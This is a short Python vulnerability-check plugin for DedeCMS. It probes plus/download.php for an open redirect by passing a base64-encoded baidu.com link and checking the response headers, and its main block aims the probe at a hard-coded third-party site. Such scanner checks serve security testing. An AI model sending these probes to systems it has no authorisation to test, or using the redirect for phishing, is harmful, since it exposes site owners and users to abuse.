#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'Ario'
#SSV-ID: 61188

def assign(service, arg):
    if service == "dedecms":
        return True, arg

def audit(arg):
    url = arg + "plus/download.php?open=1&link=aHR0cDovL3d3dy5iYWlkdS5jb20%3D"
    _, head, body, _, re_url = curl.curl(url)
    if head and head.find('http://www.baidu.com') != -1:
        security_note(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('dedecms', 'http://www.ceowo.com/')[1])
